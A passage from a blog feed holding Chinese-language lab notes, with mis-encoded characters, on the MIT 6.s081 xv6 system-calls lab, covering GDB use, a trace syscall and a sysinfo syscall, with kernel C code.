    <content type="html"><![CDATA[<blockquote><p>Before you start coding, read Chapter 2 of theÂ <a href="https://pdos.csail.mit.edu/6.828/2023/xv6/book-riscv-rev1.pdf">xv6 book</a>, and Sections 4.3 and 4.4 of Chapter 4, and related source files.</p></blockquote><h1 id="using-gdb"><a class="markdownIt-Anchor" href="#using-gdb"></a> Using GDB</h1><p>è¿™ä¸€å°èŠ‚ä¸»è¦æ˜¯é€šè¿‡æ•…æ„ä¿®æ”¹<code>syscall.c</code>ä¸­çš„ syscall ç¼–å·ä¸º <code>*(int*)0</code>å‘ç”Ÿ kernel panicï¼Œä»¥æ­¤å­¦ä¹  GDB çš„åŸºç¡€ç”¨æ³•ã€‚æŸ¥çœ‹ kernel è™šæ‹Ÿå†…å­˜æ˜ å°„å…³ç³»å¯ä»¥çŸ¥é“ 0x00 è¿™ä¸ªä½ç½®æ ¹æœ¬æ²¡æœ‰æ˜ å°„åˆ°ç‰©ç†å†…å­˜çš„é¡µï¼Œå› æ­¤è¯»å–è¿™ä¸ªå†…å­˜è™šæ‹Ÿåœ°å€çš„æ•°æ®ä¼šå‘ç”Ÿ<strong>ç¼ºé¡µï¼ˆpage faultï¼‰</strong>ã€‚<br><img src="/2025/05/15/Lab-System%20Calls/trapframe.png" alt="trapframe.png"></p><p>å¯„å­˜å™¨<code>a3</code>ä¿å­˜ num å˜é‡çš„å€¼ï¼Œåœ¨ 0x80002052 ï¼ˆkernel codeï¼‰å¦‚æˆ‘ä»¬æ‰€æ„¿åœ°é€šè¿‡ <code>0(zero)</code>å˜å€å¯»å€åˆ° 0x00ï¼Œå‘ç”Ÿ page faultã€‚å…³äºç¼ºé¡µé”™è¯¯å¤„ç†æˆ‘æ²¡æœ‰ç»§ç»­ trace ä¸‹å»ï¼Œè¿™ä¸ªä»»åŠ¡ç•™åˆ°ä¹‹åçš„å®éªŒä¸­ï¼ˆtrapsï¼‰ã€‚<br><img src="/2025/05/15/Lab-System%20Calls/fault.png" alt="fault.png"><br><img src="/2025/05/15/Lab-System%20Calls/layout.png" alt="layout.png"></p><h1 id="system-call-tracing"><a class="markdownIt-Anchor" href="#system-call-tracing"></a> System call tracing</h1><blockquote><p>In this assignment you will add a system call tracing feature that may help you when debugging later labs. Youâ€™ll create a newÂ <code>trace</code>Â system call that will control tracing. It should take one argument, an integer â€œmaskâ€, whose bits specify which system calls to trace. You have to modify the xv6 kernel to print out a line when each system call is about to return, if the system callâ€™s number is set in the mask. The line should contain the process id, the name of the system call and the return value; you donâ€™t need to print the system call arguments. TheÂ <code>trace</code> system call should enable tracing for the process that calls it and any children that it subsequently forks, but should not affect other processes.</p></blockquote><p>è¿™ä¸ªä»»åŠ¡éœ€è¦æˆ‘ä»¬æ·»åŠ ä¸€ä¸ª<code>trace</code>ç³»ç»Ÿè°ƒç”¨ï¼Œé€šè¿‡ä¼ å…¥éœ€è¦è·Ÿè¸ªçš„ç³»ç»Ÿè°ƒç”¨ç¼–å·ï¼Œ<code>trace</code>å°†ä¼šæ‰“å°å‡ºè¿›ç¨‹å¯¹è¯¥ syscall çš„è°ƒç”¨è®°å½•ã€‚</p><hr><blockquote><p>ps: ä¸ºäº†æ›´å¥½å®ç°è¿™ä¸ª syscall ï¼Œæˆ‘ä»¬åº”è¯¥å¯¹æ•´ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹æœ‰æ¸…æ™°çš„è®¤è¯†ï¼Œå³ç†è§£ç”¨æˆ·æ€ç³»ç»Ÿè°ƒç”¨å¦‚ä½•è·³è½¬åˆ°å†…æ ¸ syscall å®ç°çš„ã€‚è¿™ä¸ªè¿‡ç¨‹æ¶‰åŠç”¨æˆ·æ€ä»£ç ã€ç¡¬ä»¶é™·é˜±æœºåˆ¶å’Œå†…æ ¸æ€ä»£ç çš„ååŒå·¥ä½œï¼Œä½† trap åœ¨åé¢çš„å®éªŒæ‰ä¼šæ¶‰åŠåˆ°ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªä»»åŠ¡ä¸­æˆ‘ä»¬æš‚æ—¶å°†ä¸­é—´çš„ä¸€äº›è¿‡ç¨‹è¿›è¡ŒæŠ½è±¡ï¼Œå…¶ä¸­çš„ç»†èŠ‚è¿‡ç¨‹ç•™åˆ°åé¢çš„ lab æ¥å­¦ä¹ ã€‚</p></blockquote><p><strong>syscall è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼ˆä»¥ <code>trace</code> ä¸ºä¾‹ï¼‰ï¼š</strong></p><ol><li><p>ç”¨æˆ·æ€æŒ‰ç…§<code>user/user.h</code>ä¸­æä¾›çš„ç³»ç»Ÿè°ƒç”¨æ¥å£<code>int trace(int)</code>è°ƒç”¨ <code>trace(1 &lt;&lt; SYS_read)</code>ã€‚è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ç›¸å½“äºæ³¨å†Œéœ€è¦è·Ÿè¸ªçš„ syscallã€‚</p></li><li><p><code>trace()</code>è°ƒç”¨ <code>user/usys.S</code> ä¸­å¯¹åº”çš„æ±‡ç¼– stubã€‚é‚£ä¹ˆä»€ä¹ˆæ˜¯ <em>stub</em> ï¼ŸJust show me the codeï¼é€šè¿‡ä¸‹é¢çš„æ±‡ç¼–æˆ‘ä»¬å¯ä»¥çŸ¥é“ç¬¦å·é‡å®šå‘æ—¶ä¼šæŠŠè¿™æ®µä»£ç  copy è¿‡å»ï¼Œå®ƒçš„ä»»åŠ¡å¾ˆç®€å•ï¼Œå³æŠŠç³»ç»Ÿè°ƒç”¨ç¼–å· <code>SYS_trace</code> å†™å…¥ <code>a7</code> å¯„å­˜å™¨ï¼Œç„¶å <code>ecall</code> å°†æ§åˆ¶æƒè½¬ç§»ç»™ kernel ã€‚</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.global trace</span><br><span class="line">trace:</span><br><span class="line"> li a7, SYS_trace</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure><ol start="3"><li><code>ecall</code> æŒ‡ä»¤è§¦å‘ç¡¬ä»¶å¤„ç†é€»è¾‘ï¼Œç„¶åå†…æ ¸å¤„ç† trap ï¼Œå…¶ä¸­è¿‡ç¨‹æš‚æ—¶å¿½ç•¥ï¼Œæœ€åä¼šè°ƒç”¨ <code>syscall()</code> è¿™ä¸ªç»Ÿä¸€çš„ç³»ç»Ÿè°ƒç”¨æ¥å£ã€‚</li><li><code>syscall()</code> æ ¹æ®ç³»ç»Ÿè°ƒç”¨ç¼–å·åœ¨ <code>syscalls</code> æ•°ç»„ä¸­æŸ¥æ‰¾ handler (<code>sys_trace</code>)å¹¶è°ƒç”¨ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syscall.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;  <span class="comment">// Get the syscall number</span></span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line"></span><br><span class="line"><span class="comment">// SOMETHING ELSE</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">[SYS_fork]   = sys_fork,</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">[SYS_trace]  = sys_trace,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li><code>sys_trace</code>å³æ˜¯ kernel å¯¹äºè¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„çœŸæ­£å®ç°ï¼Œæ–‡ä»¶é‡Œçš„<code>sys_</code>å‡½æ•°æ˜¯ç”¨æˆ·ç¨‹åºé€šè¿‡ <code>ecall</code> çš„æœ€ç»ˆè°ƒç”¨ç›®æ ‡ã€‚åœ¨ <code>sys_</code> å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬æ‰å¼€å§‹è§£æ syscall ä¼ é€’çš„å‚æ•°ï¼Œç„¶åå®ç°å…·ä½“é€»è¾‘ã€‚å‚æ•°è§£æéœ€è¦é€šè¿‡<code>kernel/syscall.c</code>æä¾›çš„<code>argint</code>ã€<code>argaddr</code>å’Œ<code>argfd</code>å®Œæˆï¼Œç‰¹æ®Šåœ°è¿˜éœ€è¦ä½¿ç”¨ <code>fetchstr</code> å’Œ <code>fetchaddr</code> æ¥å®Œæˆï¼ˆè¿™ä¸€éƒ¨åˆ†æ¶‰åŠè™šæ‹Ÿåœ°å€è½¬æ¢ï¼Œç•™åœ¨ä¸‹ä¸€ä¸ª Lab åˆ†æï¼‰ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sysproc.c</span></span><br><span class="line">uint64 <span class="title function_">sys_trace</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> mask;</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;mask);</span><br><span class="line">  myproc()-&gt;mask = mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><code>sys_</code>å‡½æ•°æ‰§è¡Œåè¿”å›ç»™<code>syscall()</code>ï¼Œç»§ç»­ä¸€è·¯è¿”å›åˆ°ç”¨æˆ·æ€ï¼Œç”¨æˆ·ç¨‹åºä» <code>ecall</code> æŒ‡ä»¤ä¹‹åçš„é‚£æ¡æŒ‡ä»¤ç»§ç»­æ‰§è¡Œã€‚</li></ol><hr><p>å¤§æ¦‚ç†è§£<code>trace</code>ä½œä¸ºä¸€ä¸ªç”¨æˆ·æ€ç³»ç»Ÿè°ƒç”¨çš„è°ƒç”¨è¿‡ç¨‹åï¼Œæˆ‘ä»¬æ¥è€ƒè™‘å®ç°é€»è¾‘ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¿®æ”¹ <code>struct proc</code>ï¼ˆ<code>kernel/proc.c</code>ï¼‰ï¼Œä¸ºæ¯ä¸ªè¿›ç¨‹æ·»åŠ ä¸€ä¸ª mask å­—æ®µæ¥è®°å½•éœ€è¦è·Ÿè¸ªçš„ç³»ç»Ÿè°ƒç”¨ã€‚ï¼ˆå…¶å®æˆ‘æ„Ÿè§‰ mask ä½œä¸º process çš„ä¸€ä¸ªçŠ¶æ€æŒºå¥‡æ€ªçš„ï¼Œä½†æ˜¯æˆ‘ä¹Ÿä¸çŸ¥é“åº”è¯¥æ€ä¹ˆè®¾è®¡æ¯”è¾ƒåˆç†ï¼Œå› æ­¤æŒ‰ç…§ Lab çš„æç¤ºæ¥è¿›è¡Œã€‚ï¼‰</p><p>ä¸ºäº†æ‰“å°å‡ºè°ƒç”¨æŒ‡å®šç³»ç»Ÿè°ƒç”¨çš„è¿›ç¨‹ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹<code>syscall()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">syscall</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Tracing the system call if required</span></span><br><span class="line">    <span class="keyword">if</span>((p-&gt;mask &amp; (<span class="number">1</span> &lt;&lt; num)) != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, syscalls_name[num], p-&gt;trapframe-&gt;a0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸ºæ¯ä¸ªè¿›ç¨‹æ·»åŠ äº†ä¸€ä¸ª <code>mask</code> å­—æ®µï¼Œå› æ­¤è¿˜éœ€è¦ä¿®æ”¹ <code>fork</code> ç³»ç»Ÿè°ƒç”¨ï¼Œå°† mask ä¼ é€’ç»™å­è¿›ç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> i, pid;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">np</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// copy tracing mask from parent to child</span></span><br><span class="line">  np-&gt;mask = p-&gt;mask;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š<br><img src="/2025/05/15/Lab-System%20Calls/trace.png" alt="trace.png"></p><h1 id="sysinfo"><a class="markdownIt-Anchor" href="#sysinfo"></a> Sysinfo</h1><blockquote><p>In this assignment you will add a system call,Â <code>sysinfo</code>, that collects information about the running system. The system call takes one argument: a pointer to aÂ <code>struct sysinfo</code>Â (seeÂ <code>kernel/sysinfo.h</code>). The kernel should fill out the fields of this struct: theÂ <code>freemem</code>Â field should be set to <strong>the number of bytes of free memory</strong>, and theÂ <code>nproc</code>Â field should be set to <strong>the number of processes whoseÂ stateÂ is notÂ UNUSED</strong>.</p></blockquote><p>ä»»åŠ¡è¦æ±‚æˆ‘ä»¬å°†å†…æ ¸ç©ºé—´ä¸­çš„ä¿¡æ¯ï¼ˆ<code>freemem</code>å’Œ<code>nproc</code>ï¼‰å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ä¸­çš„ <code>sysinfo</code> ä¸­ï¼Œè¿™éœ€è¦æˆ‘ä»¬ä½¿ç”¨ <code>copyout()</code> å®ç°ä¸€äº› built-in çš„å†…æ ¸å‡½æ•°ï¼Œå†åˆ©ç”¨è¿™äº›å†…æ ¸å‡½æ•°æ¥å®ç°å…·ä½“çš„<code>sys_sysinfo()</code>ã€‚å¯¹äº <code>copyout</code> çš„å®ç°æˆ‘ä»¬è¿˜æ˜¯å…ˆä¸æ·±å…¥åˆ†æï¼Œä»¥<code>sys_fstat()</code>Â (<code>kernel/sysfile.c</code>) å’Œ Â <code>filestat()</code>Â (<code>kernel/file.c</code>) ä¸ºä¾‹æ¥ä½¿ç”¨å®ƒã€‚</p><p>å®ç° <code>sysinfo</code> éœ€è¦å¡«å……ä¸¤ä¸ªå­—æ®µä¿¡æ¯ï¼šç©ºä½™å¯ç”¨çš„å†…å­˜å¤§å° <code>freemem</code> å’ŒçŠ¶æ€ä¸æ˜¯ <code>UNUSED</code> çš„è¿›ç¨‹æ•°é‡ <code>nproc</code>ã€‚</p><h2 id="freemem"><a class="markdownIt-Anchor" href="#freemem"></a> freemem</h2><p>è¦æ‰«æç©ºä½™å†…å­˜å¤§å°ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ xv6 æ˜¯å¦‚ä½•æ¨¡æ‹Ÿ RAM çš„ï¼ˆå·¨å¤§æ•°ç»„ï¼Ÿï¼‰ã€‚ç„¶è€Œå®é™…ä¸Š xv6 å¹¶æ²¡æœ‰æ¨¡æ‹Ÿ RAMï¼Œè¿™ä¸ªå·¥ä½œç”± QEMU æ¥è¿›è¡Œï¼Œå®ƒæ¨¡æ‹Ÿäº† RAM è¿™ä¸ª<strong>ç¡¬ä»¶</strong>ï¼Œè®©è¿è¡Œåœ¨ QEMU ä¹‹ä¸Šçš„ xv6 æ“ä½œç³»ç»Ÿæ„Ÿè§‰è‡ªå·±æ˜¯åœ¨ä¸ç¡¬ä»¶äº¤äº’ã€‚æ¯”å¦‚ xv6 å°è¯•è®¿é—®ç‰©ç†å†…å­˜åœ°å€ <code>0x80200000</code>ï¼ŒQEMU ä¼šæˆªå–è¿™ä¸ªæŒ‡ä»¤å¹¶<strong>ç¿»è¯‘</strong>åœ°å€ä¸ºå®é™…æœ¬æœºçš„ä¸€ä¸ªç‰©ç†åœ°å€ã€‚</p><p>xv6 å…è®¸åˆ†é…çš„ç‰©ç†å†…å­˜åœ°å€èŒƒå›´ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/memlayout.h</span></span><br><span class="line"><span class="comment">// the kernel expects there to be RAM</span></span><br><span class="line"><span class="comment">// for use by the kernel and user pages</span></span><br><span class="line"><span class="comment">// from physical address 0x80000000 to PHYSTOP.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNBASE 0x80000000L</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHYSTOP (KERNBASE + 128*1024*1024)</span></span><br></pre></td></tr></table></figure><p><code>kernel/kalloc.c</code> å®ç°äº†å¾ˆå¤šè®¿é—®ç‰©ç†å†…å­˜çš„æ¥å£ï¼Œå…¶ä¸­å®šä¹‰äº†ä¸€ä¸ª <code>kmem</code> é“¾è¡¨ç”¨æ¥ä¿å­˜ç©ºé—²ç‰©ç†é¡µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¡«å…… <code>freemem</code> å­—æ®µçš„ helper function çš„é€»è¾‘å°±å¾ˆæ¸…æ™°äº†ï¼Œç›´æ¥éå†è¿™ä¸ªé¡µè¡¨å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line">uint64 <span class="title function_">kfreemem</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span>*  <span class="title">r</span>;</span></span><br><span class="line">  uint64 freemem = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">while</span>(r)&#123;</span><br><span class="line">    freemem += PGSIZE;</span><br><span class="line">    r = r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> freemem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="nproc"><a class="markdownIt-Anchor" href="#nproc"></a> nproc</h2><p><code>kernel/proc.c</code> ä¸­å®šä¹‰äº†æ•°ç»„ <code>struct proc proc[NPROC]</code> ç”¨æ¥ç®¡ç†æ‰€æœ‰è¿›ç¨‹ã€‚ <code>NPROC</code> æ˜¯æœ€å¤§çš„è¿›ç¨‹æ•°é‡ï¼Œæˆ‘ä»¬ç›´æ¥éå†è®¡ç®—é <code>UNUSED</code> çš„è¿›ç¨‹æ•°é‡å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line">uint64 <span class="title function_">activeproc</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>* <span class="title">p</span>;</span></span><br><span class="line">  uint64 n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    acquire(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state != UNUSED)</span><br><span class="line">      n += <span class="number">1</span>;</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sys_sysinfo"><a class="markdownIt-Anchor" href="#sys_sysinfo"></a> sys_sysinfo</h2><p>å®ç°ä¸Šè¿°ä¸¤ä¸ª helper function åï¼Œæˆ‘ä»¬æœ€ç»ˆç»„åˆå®ç°ç³»ç»Ÿè°ƒç”¨ <code>sysinfo</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sysproc.c</span></span><br><span class="line">uint64 <span class="title function_">sys_sysinfo</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">kinfo</span>;</span></span><br><span class="line">  uint64 uinfo;        <span class="comment">// user pointer to struct sysinfo</span></span><br><span class="line">  argaddr(<span class="number">0</span>, &amp;uinfo);</span><br><span class="line"></span><br><span class="line">  kinfo.freemem = kfreemem();</span><br><span class="line">  kinfo.nproc   = activeproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(copyout(myproc()-&gt;pagetable, uinfo, (<span class="type">char</span>*)&amp;kinfo, <span class="keyword">sizeof</span>(kinfo)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡å®ç°æˆ‘å‚ç…§ <code>sys_fstat()</code> æŠŠ user level ä¼ é€’çš„å‚æ•° <code>sysinfo</code> ç»§ç»­ä¼ é€’åˆ° helper funcitons é‡Œé¢ï¼ŒæŠŠå¡«å……å­—æ®µçš„å·¥ä½œäº¤ç»™<strong>åº•å±‚ utils</strong>ã€‚è¿™ä¸ä»…åŠ å¤§äº†ä»£ç çš„è€¦åˆæ€§ï¼Œè€Œä¸”ç”±äºåˆ†å­—æ®µå¡«å……ä½¿ç”¨<code>copyout</code>æ“ä½œèµ·æ¥å¹¶ä¸ä¼˜é›…ã€‚å› æ­¤ä¿®æ”¹ä¸ºå°† <code>copyout</code> å¤åˆ¶å†…æ ¸ä¿¡æ¯åˆ°ç”¨æˆ·çº§çš„è¿‡ç¨‹ç§»åˆ°äº† <code>sys_sysinfo</code> ç³»ç»Ÿè°ƒç”¨å®ç°é‡Œï¼Œä¸¤ä¸ª helper functions åªè´Ÿè´£æ”¶é›†ä¸¤ä¸ªå­—æ®µã€‚</p><p><img src="/2025/05/15/Lab-System%20Calls/sysinfo.png" alt="sysinfo.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Before you start coding, read Chapter 2 of theÂ &lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2023/xv6/book-riscv-rev1.pdf&quot;&gt;xv6 b</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>6.s081 Lab: Xv6 and Unix utilities</title>
    <link href="http://example.com/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/"/>
    <id>http://example.com/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/</id>
    <published>2025-05-06T09:13:39.861Z</published>
    <updated>2025-05-06T09:20:33.730Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sleep"><a class="markdownIt-Anchor" href="#sleep"></a> sleep</h1><blockquote><p>Implement a user-levelÂ <code>sleep</code>Â program for xv6, along the lines of the UNIX sleep command. YourÂ sleepÂ should pause for a user-specified number of ticks. A tick is a notion of time defined by the xv6 kernel, namely the time between two interrupts from the timer chip.</p></blockquote><p>å®éªŒè¦æ±‚å®ç°ä¸€ä¸ª sleep å‘½ä»¤è¡Œå‘½ä»¤<code>sleep.c</code>ï¼Œåœ¨å®ç°ä¸­è°ƒç”¨çš„<code>int sleep(int)</code>æ˜¯ xv6 æä¾›çš„ sleep syscall çš„ç³»ç»Ÿè°ƒç”¨å°è£…ï¼Œé€šè¿‡é“¾æ¥<code>user/usys.S</code>è·³è½¬åˆ°å®é™…å†…æ ¸ä»£ç çš„å®ç°<code>sys_sleep</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.global sleep         ; å£°æ˜ sleep ä¸ºå…¨å±€ç¬¦å·ï¼Œå¯ä¾›å¤–éƒ¨è°ƒç”¨</span><br><span class="line">sleep:                ; å‡½æ•°å…¥å£</span><br><span class="line">    li a7, SYS_sleep  ; å°†ç³»ç»Ÿè°ƒç”¨ç¼–å·ï¼ˆSYS_sleepï¼‰åŠ è½½åˆ°å¯„å­˜å™¨ a7</span><br><span class="line">    ecall             ; è§¦å‘environmental callï¼ˆå³trapï¼‰</span><br><span class="line">    ret               ; è¿”å›è°ƒç”¨è€…</span><br></pre></td></tr></table></figure><p>å†…æ ¸çš„<code>sys_sleep</code>å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sysproc.c</span></span><br><span class="line">uint64 <span class="title function_">sys_sleep</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  